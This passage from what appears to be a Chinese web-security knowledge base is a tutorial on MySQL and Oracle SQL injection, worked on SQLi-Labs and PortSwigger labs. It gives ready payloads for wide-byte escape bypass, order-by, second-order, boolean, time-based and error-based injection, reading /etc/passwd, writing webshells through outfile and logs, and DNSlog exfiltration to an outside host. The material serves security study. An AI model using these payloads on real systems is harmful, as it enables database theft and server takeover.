使用了GBK编码会认为两个字符为一个汉字，所以可以使用一些字符和转义过后多出来的\\组合两个字符，使得数据库不识别字符，对单引号、双引号的转义失败 形成过程 当PHP连接MYSQL时，当设置character_set_client = gbk 时会导致GBK编码转换的问题，当注入的参数里带有%df(%bf)时，在魔术引号开关或者addslashes() 函数的作用下，会将%df%27转换为%df%5c%27，此时%df%5c在会解析成一个汉字，从而“吃掉”反斜杠，单引号因此逃逸出来闭合语句 根本原因 character_set_client（客户端字符集）和 character_set_connection（连接层的字符集）不同，或转换函数如iconv,mb_convert_encoding使用不当 addslashes函数将会把接收到的id的字符进行转义处理。如： 字符'、\"、\\、NULL前边会被添加上一条反斜杠\\作为转义字符 多个空格被过滤成一个空格 当id的字符串被转义之后，就会出现如下所示的SQL语义（查询id'#的数据） select * from users where id = '1\\'#'; 看上去没有办法注入，但是我们看下面的代码： $conn->query(\"set names 'gbk';\"); // => SQL SET character_set_client ='gbk'; SET character_set_results ='gbk'; SET character_set_connection ='gbk'; payload1 ?id=1%df%27 and 1=1 %23 拼接得到的sql语句为 SELECT * FROM users WHERE id='1�\\' and 1=1-- ' LIMIT 0,1 payload2 为了避免漏洞，网站一般会设置UTF-8编码，然后进行转义过滤。但是由于一些不经意的字符集转换，又会导致漏洞 使用set name UTF-8指定了utf-8字符集，并且也使用转义函数进行转义。有时候，为了避免乱码，会将一些用户提交的GBK字符使用iconv()函数先转为UTF-8，然后再拼接SQL语句 测试语句： ?id=1%e5%5c%27 and 1=1 --+ %e5%5c 是gbk编码，转换为UTF-8编码是%e9%8c%a6 %e5%5c%27首先从gbk编码经过addslashes函数之后变成%e5%5c%5c%5c%27，再通过iconv()将其转换为UTF-8编码，%e9%8c%a6%5c%5c%27 ，其中%e9%8c%a6是汉字，%5c%5c%27解码之后是\\\\'第一个\\将第二个\\转义，使得%27单引号逃逸，成功闭合语句 order by 注入 order by 注入通常出现在排序中，前端展示的表格，某一列需要进行升序或者降序排列，或者做排名比较的时候常常会用到order by排序，order by在select语句中，紧跟在where [where condition]后，且order by 注入无法使用预编译来防御，由于order by 后面需要紧跟column_name，而预编译是参数化字符串，而order by后面紧跟字符串就会提示语法错误，通常防御order by 注入需要使用白名单的方式。 以SQLi-Labs Less46 为例 通过order by 列名，根据排序返回的情况来判断是否存在，或者使用超大数，构成SQL语句错误 ?sort=rand() ?sort=rand(1=1) ?sort=rand(1=2) ?sort=9999 基于报错的注入来判断 返回多条记录导致报错 ?sort=(select 1 union select 2) ?sort=IF(1=1,1,(select+1 from information_schema.tables)) //正确 ?sort=IF(1=2,1,(select 1 from information_schema.tables)) //错误 regexp ?sort=(select 1 regexp if(1=1,1,0x00)) // 正确 ?sort=(select 1 regexp if(1=2,1,0x00)) // 错误 报错注入函数 见报错注入 基于时间盲注来判断 如果直接使用sleep函数，如果表里的数据有n条，sleep(2)，会使查询时间为2*n，会对服务器造成拒绝服务攻击，一般不建议在order by 处使用时间盲注来判断以及注入数据 数据猜解 以猜解user() 为例，由于只能一个字符一个字符的猜解，可以利用SUBSTR,SUBSTRING,MID,以及left和right可以精准分割出每一位子串。然后就是比较操作了可以利用=,like,regexp等 利用手法可见布尔盲注，通过if语句，来对字段进行排列，通过这种差别来完成注入 二次注入 二次注入就是攻击者构造的恶意payload首先会被服务器存储在数据库中，在之后取出数据库在进行SQL语句拼接时产生的SQL注入问题。 以SQLi-Labs 24 为例 创建用户执行insert操作的关键代码，mysql_escape_string对传入的参数进行了转义，导致无法sql注入 $username= mysql_escape_string($_POST['username']) ; $pass= mysql_escape_string($_POST['password']); $re_pass= mysql_escape_string($_POST['re_password']); ... if ($pass==$re_pass) { # Building up the query........ $sql = \"insert into users ( username, password) values(\\\"$username\\\", \\\"$pass\\\")\"; } 登录的关键代码，这里将登录之后的用户名给了session function sqllogin(){ $username = mysql_real_escape_string($_POST[\"login_user\"]); $password = mysql_real_escape_string($_POST[\"login_password\"]); $sql = \"SELECT * FROM users WHERE username='$username' and password='$password'\"; $res = mysql_query($sql) or die('You tried to be real smart, Try harder!!!! :( '); $row = mysql_fetch_row($res); if ($row[1]) { $_SESSION[\"username\"] = $login; setcookie(\"Auth\", 1, time()+3600); /* expire in 15 Minutes */ header('Location: logged-in.php'); } else { return 0; } } 修改密码关键的代码，从session里取用户名，将其带入update SQL语句中 $username= $_SESSION[\"username\"]; $curr_pass= mysql_real_escape_string($_POST['current_password']); $pass= mysql_real_escape_string($_POST['password']); $re_pass= mysql_real_escape_string($_POST['re_password']); $sql = \"UPDATE users SET PASSWORD='$pass' where username='$username' and password='$curr_pass' \"; 在这里可以看到，SQL注入是存在于修改密码处，session['username'] 可控，当用户登录之后，就将用户名存起来了，而用户名又是用户自定义的，当自定义的用户名可以更改SQL语义的时候，就可以完成注入 当在登录，注册处，都无法注入成功的时候，构造用户名admin'#，当被session保存下来，再进行修改密码的时候，此时SQL语句如下所示 UPDATE users SET PASSWORD='$pass' where username='admin'# and password='$curr_pass' 用于判断用户当前密的的语义被注释，导致不用输入用户当前密码，就可以更改admin用户的密码 堆叠注入 简单的说，由于分号;为MYSQL语句的结束符。若在支持多语句执行的情况下，可利用此方法执行其他恶意语句，如RENAME、DROP等。 注意，通常多语句执行时，若前条语句已返回数据，则之后的语句返回的数据通常无法返回前端页面。建议使用union联合注入，若无法使用联合注入，可考虑使用RENAME关键字，将想要的数据列名/表名更改成返回数据的SQL语句所定义的表/列名 。 HTTP 头部注入 HTTP头部注入其实三大注入方法没什么区别，主要是补一下场景 先了解一下常见的HTTP头 Accept : 浏览器能够处理的内容类型 Accept-Charset : 浏览器能够显示的字符集 Accept-Encoding : 浏览器能处理的压缩编码 Accept-Language : 浏览器当前设置的语言 Connection : 浏览器与服务器之间的连接 cookie : 当前页面设置的cookie Host : 发出请求的页面所在域 Referer : 发出请求的页面URL User-agent : 浏览器用户代理字符串 Server : web服务器表明自己是什么软件及版本信息 HTTP 头注入是指从HTTP头中获取数据，而未对获取到的数据进行过滤，从而产生的注入。HTTP头注入常常发生在程序采集用户信息的模块中。例如: X-Forwarded-For/Client-IP 用户IP User-Agent 用户代理的设备信息 Referer 告诉服务器该网页是从哪个页面链接过来的 Cookie 标识用户的身份信息 Cookie型注入是通过Cookie进行数据提交的，其常见的情况有验证登录、$_REQUEST获取参数。验证登录是将用户的登录信息放入Cookie来做权限验证的一种方法 文件读/写 Mysql是很灵活的，它支持文件读/写功能。在讲这之前，有必要介绍下什么是file_priv和secure-file-priv。 简单的说：file_priv是对于用户的文件读写权限，若无权限则不能进行文件读写操作，可通过下述payload查询权限。 select file_priv from mysql.user where user=$USER host=$HOST; secure-file-priv是一个系统变量，对于文件读/写功能进行限制。具体如下： 无内容，表示无限制。 为NULL，表示禁止文件读/写。 为目录名，表示仅允许对特定目录的文件进行读/写。 5.5.53本身及之后的版本默认值为NULL，之前的版本无内容。 三种方法查看当前secure-file-priv的值： select @@secure_file_priv; select @@global.secure_file_priv; show variables like \"secure_file_priv\"; 修改secure-file-priv值： 通过修改my.ini文件，添加：secure-file-priv= 启动项添加参数：mysqld.exe --secure-file-priv= 读文件 在确定了用户有读，写权限之后，一般使用load_file()函数来读取文件内容 select load_file(file_path); -- file_path为绝对路径 load data infile \"/etc/passwd\" into table test FIELDS TERMINATED BY '\\n'; --读取服务端上的文件 load data local infile \"/etc/passwd\" into table test FIELDS TERMINATED BY '\\n'; -- 读取客户端上的文件 限制： 前两种需要secure-file-priv无值或为有利目录。 都需要知道要读取的文件所在的绝对路径。 要读取的文件大小必须小于max_allowed_packet所设置的值 写文件 常规写文件的操作有如下字句： select 1,\"\" into outfile '/var/www/html/1.php'; select 2,\"\" into dumpfile '/var/www/html/1.php'; 那么into outfile和into dumpfile有什么区别呢？ into outfile 是导出所有数据，适合导出库 into dumpfile 只能导出一行数据 限制： secure-file-priv无值或为可利用的目录 需知道目标目录的绝对目录地址 目标目录可写，mysql的权限足够。 日志包含 由于mysql在5.5.53版本之后，secure-file-priv的值默认为NULL，这使得正常读取文件的操作基本不可行。我们这里可以利用mysql生成日志文件的方法来绕过。 mysql日志文件的一些相关设置可以直接通过命令来进行： //请求日志 mysql> set global general_log_file = '/var/www/html/1.php'; mysql> set global general_log = on; //慢查询日志 mysql> set global slow_query_log_file='/var/www/html/2.php' mysql> set global slow_query_log=1; //还有其他很多日志都可以进行利用 ... 之后让数据库执行满足记录条件的恶意语句即可，具体可查看phpmyadmin通过日志写入webshell相关的教程 限制： 权限够，可以进行日志的设置操作 知道目标目录的绝对路径 DNSlog外带数据盲注 DNSLOG，简单的说，就是关于特定网站的DNS查询的一份记录表。若A用户对B网站进行访问/请求等操作，首先会去查询B网站的DNS记录，由于B网站是被我们控制的，便可以通过某些方法记录下A用户对于B网站的DNS记录信息。此方法也称为OOB注入。 如何用DNSLOG带出数据？若我们想要查询的数据为：aabbcc，那么我们让mysql服务端去请求aabbcc.evil.com，通过记录evil.com的DNS记录，就可以得到数据：aabbcc。 应用场景： 三大注入无法使用 有文件读取权限及secure-file-priv无值。 不知道网站/目标文件/目标目录的绝对路径 目标系统为Windows payload: load_file(concat('\\\\',(select user()),'.xxxx.ceye.io\\xxxx')) 为什么Windows可用，Linux不行？这里涉及到一个叫UNC的知识点。简单的说，在Windows中，路径以\\开头的路径在Windows中被定义为UNC路径，相当于网络硬盘一样的存在，所以我们填写域名的话，Windows会先进行DNS查询。但是对于Linux来说，并没有这一标准，所以DNSLOG在Linux环境不适用。注：payload里的四个\\\\中的两个\\是用来进行转义处理的。 Copyright © aaron 2023 all right reserved，powered by Gitbook该文章修订时间： 2023-05-19 11:29:22 Author: aaron Url: https://byaaronluo.github.io/知识库/01.WEB安全/01.SQLi/MYSQL/MySQL注入基础.html Source: aaron 知识库 This article was originally published in「aaron 知识库」,Reproduced please indicate the source, thank you for cooperation! "},"知识库/01.WEB安全/01.SQLi/Oracle/Oracle.html":{"url":"知识库/01.WEB安全/01.SQLi/Oracle/Oracle.html","title":"Oracle","keywords":"","body":" Oracle 简介 一些基本概念 Oracle 数据结构 权限和用户 权限与角色 SQL语句 参考链接 Oracle 简介 Oracle Database，又名Oracle RDBMS，或简称Oracle。是甲骨文公司的一款关系数据库管理系统，系统可移植性好、使用方便、功能强，适用于各类大、中、小、微机环境。它是一种高效率、可靠性好的、适应高吞吐量的数据库方案。 数据库(Database)可以看成是一个大仓库，然后仓库里面又很分了很多的库房(Schema)，一个Schema就是一个库房，那么库房里面自然就有很多货架(Table)， 那么货架上就可以放很多你想存储的东西，有行有列，所以货架(Table)就是数据存储的基本单位。每个库房(Schema)都会有一个管理人员(User),这个关系是对应的，每个User只管理自己相应Schema里面的数据，如果你想要其他Schema里面的数据，就看管理这个Schema的User给不给你权限了，或者说看上一级领导(DBA)有没有给你这个权限，可能有的User管理着好几个Schema。如果你是仓库的老板，那么仓库里面的所有东西都是你的，你想存储什么或丢掉什么都是老板话算，还可以给下层的人分配不同的权限，比如仓库的不同主管，有的主管可能只读，有的主管有读写权限，这个就要涉及到仓库不同的角色(Role)，角色是一个权限的集合，不同的角色有不同的权限去管理这个数据库。 一些基本概念 SID(Site ID)：一个由字母和数字组成的系统标识符用来做实例的唯一性的区别，包含了至少一个应用程序的实例和数据存储设备 实例(Instance):由一个实例数字(或是一个引导ID：SYS.V_$DATABASE.ACTIVATION#）表示，包含了一个操作系统程序的集合和与存储设备进行交谈的内部结构 ORACLE实例 = 进程 + 进程所使用的内存(SGA) 进程：负责接受和处理客户端传来的数据，如 Windows 下由 oracle.exe 进程负责分发和处理请求 SGA:全称为 System Global Area(系统全局区域)。实际上是内存中的一片共享区域，其中包含实例配置、数据缓存、操作日志、SQL命令、用户信息等信息，由后台进程进行共享 数据库：一般指物理存储的文件，Oracle 数据库除了基本的数据文件，还有控制文件和 Redo 日志(重做文件 + 控制文件 + 数据文件 + 临时文件)，这些文件一般存储在$ORACLE_HOME\\oradata...路径下，后缀名后DBF 关于实例和数据库之间的关系 简而言之，实例是临时性的，数据库是永久性的，一个数据库可以对应多个实例，而一个实例只能对应一个数据库 Oracle 数据结构 逻辑结构：表空间-->段-->区-->块 物理结构 Oracle关系型数据库管理系统从逻辑上把数据保存在表空间内，在物理上以数据文件的形式存储。表空间可以包含多种类型的内存区块，例如数据区块（Data Segment）、索引区块（Index Segment）等等。区块相应的由一个或多个扩展（extent）组成 表空间(Tablespace)：数据文件就是由多个表空间组成的，这些数据文件和相关文件形成一个完整的数据库（以下的DBF后缀就是数据库默认创建的表空间） SYSTEM表空间：包含了数据字典以及（默认的）索引和集群。数据字典包含了一个保存了所有数据库中用户对象的信息的表,用于存储系统表和管理配置等基本信息 SYSAUX表空间：是SYSTEM表的一个辅助表空间，主要存放一些系统附加信息，用来降低SYSTEM表空间的负载 TEMP表空间：是个临时表空间，主要用途是在数据库进行排序运算、管理索引、访问视图等操作时提供临时的运算空间，运算完后系统自动清理，可减少内存负担(temp表的大小也会一直增长) UNDOTBS表空间：用于事务回退的表空间，存放撤销数据 USERS表空间：通常用于存放应用系统所使用的数据库对象，存储我们定义的表和数据 EXAMPLE表空间：存放各实例的相关数据 权限和用户 权限与角色 Oracle 中划分了许多用户权限，权限的集合称为角色。例如 CONNECT 角色具有连接到数据库权限，RESOURCE 能进行基本的 CURD 操作（即，增加：create，修改：update，查找：read，删除：delete），DBA 则集合了所有的用户权限。 创建数据库时，会默认启用 sys、system 等用户： sys：相当于 Linux 下的 root 用户。为 DBA 角色 system：与 sys 类似，但是相对于 sys 用户，无法修改一些关键的系统数据，这些数据维持着数据库的正常运行。为 DBA 角色。 public：public 代指所有用户（everyone），对其操作会应用到所有用户上（实际上是所有用户都有 public 用户拥有的权限，如果将 DBA 权限给了 public，那么也就意味着所有用户都有了 DBA 权限）SQL语句 select column, group_function(column) from table [where condition] [group by group_by_expression] [having group_condition] [order by column]; 执行过程：from — where — group by — having — select — order by,可以看出，和 MySQL 很类似。实际上都是 SQL 标准的语法 参考链接 https://xz.aliyun.com/t/9940 https://xz.aliyun.com/t/7897 https://blog.csdn.net/yuyecsdn/article/details/91410802 https://www.tr0y.wang/2019/04/16/Oracle%E6%B3%A8%E5%85%A5%E6%8C%87%E5%8C%97/ Copyright © aaron 2023 all right reserved，powered by Gitbook该文章修订时间： 2023-05-19 11:41:54 Author: aaron Url: https://byaaronluo.github.io/知识库/01.WEB安全/01.SQLi/Oracle/Oracle.html Source: aaron 知识库 This article was originally published in「aaron 知识库」,Reproduced please indicate the source, thank you for cooperation! "},"知识库/01.WEB安全/01.SQLi/Oracle/Oracle常用符号函数语句归类.html":{"url":"知识库/01.WEB安全/01.SQLi/Oracle/Oracle常用符号函数语句归类.html","title":"Oracle常用符号函数语句归类","keywords":"","body":" 常用符号 常用函数 字符函数 数学函数 转换函数 其他函数/表达式 语句归类 获取数据库版本 获取操作系统版本 获取当前用户权限的所有数据库 获取当前数据库 获取用户信息 获取当前数据库中的表名 获取当前数据库下某表的所有列名 查询值 子查询，分页实现limit 常用符号 符号 释义 -- 单行注释符 /**/ 多行注释符 || 用于字符拼接 null 表示空字符串 dual 虚拟表，在进行select操作必带 常用函数 字符函数 函数 释义 ascii select ascii('a') from dual 结果97 chr select chr(97) from dual 结果'a' upper SELECT Upper ('abcde') FROM dual 结果：ABCDE lower SELECT lower('ABCDE') FROM dual 结果：abcde initcap SELECT Initcap ('AAA') FROM dual 结果：Aaa SELECT Initcap ('aaa') FROM dual 结果：Aaa | | concat | SELECT Concat ('a', 'b') FROM dual 结果：ab Select 'a' || 'b' from dual 结果：ab | | substr | Select substr('abcde',0,3) from dual 结果：abc | | length | Select length('abcde') from dual 结果：5 | | replace | Select replace('abcde','a','A') from dual 结果：Abcde | | instr | Select instr('Hello World','W') from dual 结果：8 Select instr('Hello World','w') from dual 结果：0 如果在第一个参数中存在第二个参数，则返回第一个遇到的匹配参数的位置，该方法区分大小写 | | trim | select trim(' Mr Smith ') from dual 结果：Mr Smith | | lpad | select lpad('Smith',10,'') from dual 结果：**Smith | | rpad | select rpad('Smith',10,'') from dual 结果：Smith** | 数学函数 函数 释义 round select round(412,-2) from dual; 结果：400 向上取整运算，第二个参数指定了取小数点后的几位，如果是5则进一。 | | Mod | select Mod(198,2) from dual 结果：0 取模运算 | | ABS | select abs(-2) from dual 结果： 2 | | Trunc | select trunc(412.13,2) from dual 结果：412.13 select trunc(412.53) from dual 结果：412 向下取整运算，第二个参数指定了取小数点后的几位 | 转换函数 函数 释义 to_char select to_char(1) from dual 结果：'1' to_number select to_number('1') from dual 结果：1 to_date select to_date('2021-1-1','yyyy-MM-dd') from dual 结果：01-JAN-21 其他函数/表达式 函数 释义 NVL select nvl('string',0) from dual 结果：string select nvl('',0) from dual 结果：0 从两个表达式返回一个非 null 值 | | NULLIF | select nullif('abc','abc') from dual 结果：空 select nullif('abc','abcd') from dual 结果：abc 如果两个指定的表达式相等，则返回空值，否则返回第一个表达式 | | NVL2 | select nvl2('a','b','c') from dual 结果：b select nvl2('','b','c') from dual 结果：c 如果第一个参数不为空，则返回第二个参数；否则，返回第三个参数 | | decode | select decode('1','1',1,2) from dual; 结果：1 第一个参数是否等于第二个参数，如果等于，则返回第三个参数，否则返回第四个参数，可用于行转列 | | DBMS_PIPE.RECEIVE_MESSAGE | select dbms_pipe.receive_message('o',10)from dual; 结果：1 时间注入函数，两个参数，从指定管道获取消息,timeout 为 integer的可选输入参数，用来指定等待时间 | | case...when...then..else...end | select case when 1=1 then 1 else 2 end from dual 结果：1 | 语句归类 获取数据库版本 SELECT banner FROM v$version WHERE banner LIKE 'Oracle%'; SELECT version FROM v$instance; 获取操作系统版本 SELECT banner FROM v$version where banner like 'TNS%' 获取当前用户权限的所有数据库 SELECT DISTINCT owner FROM all_tables; 获取当前数据库 这里需要说明一下，由于Oracle 中使用 Schema 的概念将每个用户的数据进行分离，Schema 其实类似于命名空间（Namespace），默认情况下，Schema 的名称同用户名称相同，其实在这里用这种方法去查所谓的当前数据库，但是在all_tables里其实都没有，使用SQLMAP跑出来的库也没有，所以当前数据库使用select user from dual SELECT global_name FROM global_name; SELECT name FROM v$database; SELECT instance_name FROM v$instance; SELECT SYS.DATABASE_NAME FROM DUAL; 获取用户信息 -- 当前数据库用户 SELECT user FROM dual; -- 所有数据库用户 SELECT username FROM all_users ORDER BY username; -- 当前用户权限 SELECT * FROM session_privs; -- 用户角色 SELECT GRANTEE, GRANTED_ROLE FROM DBA_ROLE_PRIVS; 获取当前数据库中的表名 -- 以SYSTEM 为例子 -- 所有用户的表 select distinct table_name from all_tables where owner = 'SYSTEM' -- 当前用户的表，这里会有很多不需要的数据，其实不建议使用 select table_name from user_tables; -- 包括系统表，需要高权限 select table_name from dba_tables where owner = 'SYSTEM'; 获取当前数据库下某表的所有列名 select column_name from all_tab_columns where table_name ='USERS_KVHXKJ' 查询值 select USERNAME_ETSGGX,PASSWORD_OEDQBQ from USERS_KVHXKJ 子查询，分页实现limit -- 这里以获取当前用户权限所拥有的数据库 -- 以下是实现limit 1,1 select owner from (select t.owner,rownum as no from (select distinct owner from all_tables)t) where no = 1 -- 实现多个 使用between and select owner from (select t.owner,rownum as no from (select distinct owner from all_tables)t) where no between 1 and 10 Copyright © aaron 2023 all right reserved，powered by Gitbook该文章修订时间： 2023-05-19 10:41:07 Author: aaron Url: https://byaaronluo.github.io/知识库/01.WEB安全/01.SQLi/Oracle/Oracle常用符号函数语句归类.html Source: aaron 知识库 This article was originally published in「aaron 知识库」,Reproduced please indicate the source, thank you for cooperation! "},"知识库/01.WEB安全/01.SQLi/Oracle/Oracle注入基础.html":{"url":"知识库/01.WEB安全/01.SQLi/Oracle/Oracle注入基础.html","title":"Oracle注入基础","keywords":"","body":" 初始环境 强调 联合查询注入 注入流程 确定字段的数量 确定页面回显位 查询数据 盲注 布尔盲注 布尔盲注流程 布尔盲注判断注入点 布尔盲注常用函数 布尔盲注手法 时间盲注 常用函数/表达式 DBMS_PIPE.RECEIVE_MESSAGE 子查询/超大表构造时间盲注 报错注入 ctxsys.drithsx.sn() XMLType() dbms_xdb_version.checkin() dbms_xdb_version.makeversioned() dbms_xdb_version.uncheckout() dbms_utility.sqlid_to_sqlhash() ordsys.ord_dicom.getmappingxpath() utl_inaddr.*() OOB 外带注入 utl_http.request() utl_inaddr.get_host_address() SYS.DBMS_LDAP.INIT()函数 HTTPURITYPE() 其他攻击方式 Oracle XXE Oracle 提权漏洞 命令执行 反弹shell 初始环境 环境 版本 服务器 Linux 数据库 Oracle Database 11g Express Edition Release 11.2.0.2.0 - 64bit Production web https://portswigger.net/web-security/sql-injection/examining-the-database/lab-listing-database-contents-oraclehttp://o1.lab.aqlab.cn:81/?id=1 docker https://github.com/ChaMd5Team/Pentest-tools/tree/master/Oracleinject 由于环境比较难找，这里使用burp官方提供的靶场来对三大注入方式（联合查询、盲注、报错注入）来进行讲解，练习SQL注入的同时我在本地搭建了一个Oracle的docker来配合练习Oracle的SQL语句，因为未接触过多的Oracle注入，如果大家有更好的注入方式，欢迎各位讨论 强调 与MySQL，MSSQL一样，Oracle数据库也是关系型数据库且支持标准型SQL语句，所以注入方式和其他关系型数据库一样，不过有一点特殊，这里强调一下Oracle查询数据的特性： Oracle 使用查询语句获取数据时需要跟上表名，在没有表的情况下可以使用dual，dual是Oracle的一个虚拟表，用来构成select的语法规则，且Oracle保证dual里永远只有一条记录 如： -- 在mysql，mssql，postgresql中 select 1,2; -- 都是正确的 -- 但是在Oracle中，需要带上dual表 select 1,2 from dual; 与Postgresql 一样，Oracle 的 ||是字符串连接符 在oracle中存在concat()函数（用法同Mysql concat()，但只能有两个参数），聚合所有结果的连接函数wm_concat()函数（同mysql group_concat()） Oracle 不支持堆叠查询 联合查询注入 联合查询注入，和其他关系型数据库注入方式一致，需要注入的页面有明显的回显位，其作用就是，在原来的查询条件的基础上，通过关键字 union，union all，从而拼接恶意SQL语句，union后面的select 得到的结果将拼接到前个select的结果的后面 若回显仅支持一行数据的话，让union前边正常的查询语句返回的结果为空 使用union select进行拼接时，注意前后两个select语句的返回的字段数必须相同，否则无法拼接 union,union all区别： union: 对两个结果集进行并集操作，不包括重复行，同时进行默认规则的排序 union all: 对两个结果集进行并集操作，包括重复行，不进行排序；注入流程 这里以靶场为例，在判断出存在注入点后，注入流程如下所示： ```basic 确定字段的数量 确定页面回显位 利用已知回显位查询数据 a.查询数据库基本信息 b.爆库名 c.爆表名 d.爆字段 e.查询敏感信息 ``` 确定字段的数量 使用order by语句，通过拼接数字，可确定字段数量，若大于，则页面错误/无内容，若小于/等于，则页面正常，若错误页面与正确页面一致，更换盲注或报错注入。 正常页面： 错误页面： 确定页面回显位 在这里知道了字段数为2，那么就要判断回显位了，使用union select '1','2' form dual将定义的数字显示在页面上，就可以判断页面的回显位了 注意： 若确定页面有回显，但是页面中并没有我们定义的特殊标记数字出现，可能是页面现在了单行数据输出，我们让前边的select查询条件返回结果为空即可 注意一定要拼接够足够的字段数，否则SQL语句报错。PS：此方法也可作为判断前条select语句的方法之一 如果union前面的查询条件返回为空的情况下，也没有标记数字，这时候一般是类型出错，导致无法显示在页面，可以将数字更改未null，如下所示 查询数据 通过第3步，找到回显位置之后，首先需要探测相关环境，如下所示 探测Oracle版本 select banner from v$version; select banner from v$version where banner like 'Oracle%'; select version from v$instance; 探测操作系统版本 select banner from v$version where banner like 'TNS%' 探测当前数据库用户 select user from dual; 获取当前数据库用户权限 select privilege from session_privs; -- Oracle 实现limit 使用rownum，构造between...and... select * from (select t.* ,rownum as no from (select * from session_privs)t) where no between 1 and 10 Oracle 实现分页 获取用户所拥有权限的数据库 select distinct owner from all_tables 由于Oracle 中使用 Schema 的概念将每个用户的数据进行分离，Schema 其实类似于命名空间（Namespace），默认情况下，Schema 的名称同用户名称相同。所以当前数据库为SYSTEM 获取当前数据库中的表 -- 所有用户的表 select distinct table_name from all_tables where owner = 'SYSTEM' -- 当前用户的表 select table_name from user_tables; -- 包括系统表 select table_name from dba_tables where owner = 'SYSTEM'; 获取当前SYSTEM数据库中表USER*表的字段 首先先查询当前SYSTEM数据库中的USER*表 select table_name from all_tables where owner='SYSTEM' and table_name like 'USER%' select column_name from all_tab_columns where table_name ='USERS_KVHXKJ' 获取值 select USERNAME_ETSGGX,PASSWORD_OEDQBQ from USERS_KVHXKJ 盲注 布尔盲注 Oracle 布尔盲注和Mysql盲注一样，通过页面对带入数据库永真/假条件返回的内容差异，从而判断是否可以进行布尔盲注。通常页面返回存在/不存在两个结果，就可以判断是否存在布尔注入了 布尔盲注流程 1. 判断注入点 2. 求解数据库 a. 判断用户/当前数据库长度 b. 依次求解用户/当前数据库长度 3. 求当前数据库表 a. 判断当前数据库表的个数 b. 猜解第一个表的长度 c. 猜解表的字符串/ascii码值 d. 依次求解，直到找到所有的表 4. 求某表的列名 a. 判断该表列名的个数 b. 猜解第一个列名的长度 c. 猜解第一个列名的字符串/ascii码值 d. 依次求解，直到该表中找到所有的列名 5. 求某表的值 a. 判断字段的个数 b. 猜解第一个字段的长度 c. 猜解第一个字段的字符串/ascii码值 d. 依次求解，直到查询完表中所有的值 布尔盲注判断注入点 and 1=1 恒真 select * from xxx_table where xxx='xxx' and 1=1--' and 1=2 恒假 利用这一特性，我们可以构造payload 通过来页面显示情况来获取数据库数据 布尔盲注常用函数 ascii() substr() decode(a,b,c,d) 当a=b 返回c，否则返回d instr(a,b) 如果b字符串存在a 中，返回b在a中存在的位置，否则返回0布尔盲注手法 获取当前数据库的用户名select * from xxx_table where xxx='xxx' and ascii(substr((select user from dual),1,1))=83--+ ASCII('S') = 83 依次对字符串求解，当截取到最后一位（+1）时会substr()函数会返回空字符串，这里用is null 可以判断是否为空，当is null 是第7位成立，那么字符串长度为6位 ASCII('M')=77 获取所有的数据库 前面在联合查询处说了，Oracle 使用Schema 来控制不同用户的数据，所以当前数据库为用户名SYSTEM(Oracle 对大小写敏感) 在查询所有的数据库时，不能像MySQL那样使用limit，所以在Oracle中需要使用子查询来写SQL语句，类似如下 select owner from (select t.* ,rownum as no from (select distinct owner from all_tables)t) where no = 1 以第一个数据库为例子，首先确定库的长度 select length(owner) from (select t.* ,rownum as no from (select distinct owner from all_tables)t) where no = 1 然后配合使用ascii()，substr()函数来对字符进行依次猜解 ascii('A') = 65 依次猜解，可获取库的名称，由于没有limit，在子查询中，distinct 去重owner会消耗过多的时间，所以尽量使用手工注入，且要获取其他库的数据也没有太大的必要 获取当前数据库的表 -- 首先获取当前数据库存在多少表 select count(table_name) from all_tables where owner = 'SYSTEM' -- 接着使用子查询，一个一个求解 select table_name from (select t.table_name,rownum as no from (select table_name from all_tables where owner='SYSTEM')t) where no = 1 如猜解USERS_YFRUVP表 -- select table_name from (select t.table_name,rownum as no from (select table_name from all_tables where owner='SYSTEM' and table_name not like '%$%')t)where no = 4 中间省略... 获取某表中的字段 以USERS_YFRUVP表为例 -- 求字段个数 select count(*) from all_tab_columns where table_name = 'USERS_YFRUVP' -- 接着求解字段的长度,子查询实现limit select length(column_name) from (select t.column_name ,rownum as no from (select column_name from all_tab_columns where table_name='USERS_YFRUVP')t) where no = 1 在得知长度为15的情况下，开始猜解列名 select column_name from (select t.column_name ,rownum as no from (select column_name from all_tab_columns where table_name='USERS_YFRUVP')t) where no = 1 依次求解，猜解的列名如下： USERNAME_BNQFMG，PASSWORD_FFFBAY 针对已知的列名，再带入表中求解字段 获取某表的值 -- 在得知用户名为administrator的情况下，使用如下payload可以获取密码，若不知道用户名，且表中 -- 数据不为1，需要使用子查询来实现limit select PASSWORD_FFFBAY from USERS_YFRUVP where USERNAME_BNQFMG = 'administrator' 密码为：1ta07a6rpakca47n3iui 类似decode()，instr()函数用法 -- 该语句表示如果a==b 返回c ，否则返回d select decode(a,b,c,d) from dual; -- 该语句表示b字符串存在a 中，返回b在a中存在的位置，否则返回0 select instr(a,b) from dual; 如下图所示，看到这里构造expression就懂了吧。。。 时间盲注 常用函数/表达式 decode() 类似mysql中的if case...when...then...else...end DBMS_PIPE.RECEIVE_MESSAGEDBMS_PIPE.RECEIVE_MESSAGE 如果无法通过页面差来进行注入，这时就需要使用时间盲注，时间盲注主要通过判断页面返回内容的响应时间差异进行条件判断。 Oracle主要是使用DBMS_PIPE.RECEIVE_MESSAGE('**pipename**',timeout)函数，该函数从指定管道获取消息，pipename为varchar(128)的字符串，用以指定管道名称，在这里我们输入任意值即可。 timeout为integer的可选输入参数，用来指定等待时间。select dbms_pipe.receive_message('o', 10) from dual; 配合使用decode函数，来构成条件语句，实现时间盲注 decode函数可以当成MYSQL中的IF函数使用，相应的表达式可以参照布尔盲注select decode(substr((select user from dual),1,1),'S',dbms_pipe.receive_message('o', 5),2) from dual 也可以使用case...when.. then...else...end 来代替decode 依次求解数据库，表，列名，字段值子查询/超大表构造时间盲注 时间盲注不一定要用DBMS_PIPE.RECEIVE_MESSAGE()函数，当在进行笛卡尔积，或者查询系统表，子查询大表的时候也会造成数据库查询时间很慢，比如在布尔盲注中查询当前用户权限可访问的数据库，需要一个一个表示的时候，在子查询中去重就会消耗大量时间，如下： 报错注入 报错注入靶场环境 在进行报错注入之前，首先要确定目标环境在web页面上是否有错误回显，通常使用order by 大数字，或者构造错误的sql语句来判断，介绍几种报错注入函数，其他payload也就是换子查询的SQL语句ctxsys.drithsx.sn() select ctxsys.drithsx.sn(1,(select user from dual)) ?id=1 and ctxsys.drithsx.sn(1,(select user from dual))=1-- ?id=1 and ctxsys.drithsx.sn(1,(select banner from v$version))=1-- XMLType() select upper(xmltype(chr(60)||chr(58)||(select user from dual)||chr(62))) from dual; -- paylaod and (select upper(xmltype(chr(60)||chr(58)||(select user from dual)||chr(62))) from dual) is not null-- dbms_xdb_version.checkin() select dbms_xdb_version.checkin((select user from dual)) from dual --payload and (select dbms_xdb_version.checkin((select user from 